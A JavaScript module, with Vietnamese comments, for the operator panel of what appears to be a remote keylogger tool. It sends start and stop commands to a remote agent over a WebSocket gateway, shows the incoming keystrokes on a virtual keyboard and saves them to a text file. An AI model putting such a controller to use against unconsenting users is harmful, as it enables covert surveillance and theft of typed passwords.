import * as Logic from './logic.js';

class KeyloggerUI {
    constructor() {
        // State
        this.isLogging = false;
        this.logBuffer = ""; // Biến lưu toàn bộ nội dung keylog
        this.originalOnKeylog = null; // Lưu callback gốc từ main.js

        // DOM Elements
        this.displayInput = document.getElementById('keylog-panel');
        this.btnMenu = document.querySelector('.btn-menu');
        this.btnStart = document.querySelector('.btn-start');
        this.btnStop = document.querySelector('.btn-stop');
        this.btnSave = document.querySelector('.btn-save');
        this.keys = document.querySelectorAll('.key');

        this.init();
    }

    init() {
        // Đợi window.gateway được khởi tạo từ main.js
        const waitForGateway = () => {
            if (!window.gateway) {
                setTimeout(waitForGateway, 100);
                return;
            }

            // Lưu callback gốc từ main.js và wrap nó với handler của chúng ta
            this.originalOnKeylog = window.gateway.callbacks?.onKeylog;
            
            // Override onKeylog callback để xử lý visual effects
            // Vẫn gọi callback gốc để main.js có thể update display
            window.gateway.callbacks.onKeylog = (data, senderId) => {
                // Gọi handler gốc để update display (từ main.js)
                if (this.originalOnKeylog) {
                    this.originalOnKeylog(data, senderId);
                }
                // Xử lý visual effects và buffer riêng của keylog.js
                this.handleIncomingKey(data, senderId);
            };

        // 2. Gán sự kiện cho các nút
        this.btnMenu.addEventListener('click', () => {
            window.location.href = 'Feature_menu.html';
        });
        this.btnStart.onclick = () => this.startKeylog();
        this.btnStop.onclick = () => this.stopKeylog();
        this.btnSave.onclick = () => this.saveToDevice();

            // 3. Inject CSS để phục vụ việc "nháy đèn" phím khi nhận tín hiệu
            this.injectActiveStyle();
            
            // 4. Đọc agent ID từ URL và tự động setTarget (nếu có)
            Logic.initAgentTargetFromURL();
            
            this.logSystem("Ready. Press 'Start keylog' to begin.");
        };

        waitForGateway();
    }


    // --- Command Functions ---

    startKeylog() {
        if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
            alert("Chưa kết nối Gateway! Vui lòng đợi kết nối...");
            return;
        }

        if (!window.gateway.isAuthenticated) {
            // Tự động Auth nếu chưa đăng nhập
            Logic.authenticate();
            // Đợi một chút để auth hoàn tất
            setTimeout(() => {
                this.startKeylog();
            }, 500);
            return;
        }

        this.isLogging = true;
        
        // Gửi lệnh Start Keylog tới Server/Agent
        // interval: 0.1 để nhận dữ liệu gần như realtime cho hiệu ứng mượt
        Logic.startKeylog(0.1);
        
        if (this.btnStart) {
            this.btnStart.style.backgroundColor = "#22c55e"; // Green signals active
            this.btnStart.innerText = "Monitoring...";
        }
    }

    stopKeylog() {
        if (!window.gateway) return;

        this.isLogging = false;
        
        Logic.stopKeylog();
        
        if (this.btnStart) {
            this.btnStart.style.backgroundColor = ""; // Reset color
            this.btnStart.innerText = "Start keylog";
        }
    }

    // --- Core Logic: Xử lý dữ liệu nhận về ---

    /**
     * Xử lý luồng data nhận được từ Socket
     * @param {string} dataString - Chuỗi ký tự nhận được (có thể là 1 hoặc nhiều ký tự)
     */
    handleIncomingKey(dataString, senderId) {
        if (!this.isLogging) return;

        // Xử lý dữ liệu qua logic.js
        const processed = Logic.processKeylogData(dataString, senderId);
        if (!processed.processed) return;

        // Xử lý UI cho từng ký tự
        processed.chars.forEach(char => {
            // 1. Lưu vào buffer (để tải file)
            this.logBuffer += char;

            // 2. Hiển thị lên thanh Input màu xám
            this.updateDisplay(char);

            // 3. Hiệu ứng Visual trên bàn phím ảo
            this.visualizeKey(char);
        });
    }

    updateDisplay(char) {
        if (!this.displayInput) return;

        // Giả lập hành vi nhập liệu cơ bản
        if (char === '\b' || char === 'Backspace') {
            this.displayInput.value = this.displayInput.value.slice(0, -1);
        } else if (char === '\n' || char === 'Enter') {
            // Input type text không hiển thị xuống dòng, ta có thể thay bằng ký hiệu
            // hoặc giữ nguyên nếu muốn save file đúng định dạng.
            // Ở đây ta hiển thị ký hiệu để người dùng biết đã xuống dòng.
            this.displayInput.value += "↵ "; 
        } else if (char.length === 1) {
            this.displayInput.value += char;
        }
        
        // Auto scroll input sang phải cùng
        this.displayInput.scrollLeft = this.displayInput.scrollWidth;
    }

    visualizeKey(char) {
        let targetKey = null;
        const lowerChar = char.toLowerCase();

        // Mapping ký tự đặc biệt sang Text hiển thị trên bàn phím HTML
        const specialMap = {
            '\n': 'enter',
            '\r': 'enter',
            ' ': 'space', // Space trong HTML là div rỗng, ta xử lý riêng bên dưới
            '\t': 'tab',
            '\b': 'backspace',
            'backspace': 'backspace'
        };

        // Tìm phím trên DOM
        for (let key of this.keys) {
            let keyText = key.innerText.toLowerCase().trim();
            
            // Xử lý phím Space (trong HTML là div rỗng class k-6-25)
            if (char === ' ' && keyText === '' && key.classList.contains('k-6-25')) {
                targetKey = key;
                break;
            }

            // Xử lý các phím ký tự thường và phím chức năng
            if (keyText === lowerChar || keyText === specialMap[lowerChar]) {
                targetKey = key;
                break;
            }
        }

        // Nếu tìm thấy phím, kích hoạt hiệu ứng
        if (targetKey) {
            targetKey.classList.add('active-simulation');
            setTimeout(() => {
                targetKey.classList.remove('active-simulation');
            }, 150); // Nháy trong 150ms
        }
    }

    // --- File Operations ---

    saveToDevice() {
        if (!this.logBuffer) {
            alert("Chưa có dữ liệu để lưu!");
            return;
        }

        const blob = new Blob([this.logBuffer], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
        a.href = url;
        a.download = `keylog_${timestamp}.txt`;
        document.body.appendChild(a);
        a.click();
        
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.logBuffer = "";
        if (this.displayInput) {
            this.displayInput.value = "";
        }

        this.logSystem(">>> Log saved & cleared.");
    }

    // --- Helpers ---

    logSystem(msg) {
        console.log(`[KeylogUI] ${msg}`);
        // Có thể hiển thị thông báo lên UI nếu cần
    }

    injectActiveStyle() {
        const style = document.createElement('style');
        style.innerHTML = `
            .key.active-simulation {
                background-color: #E57D36 !important;
                color: #fff !important;
                transform: translateY(3px);
                box-shadow: none !important;
                transition: all 0.05s ease;
            }
        `;
        document.head.appendChild(style);
    }
}

// Khởi chạy khi DOM load xong
document.addEventListener('DOMContentLoaded', () => {
    window.keyloggerApp = new KeyloggerUI();
});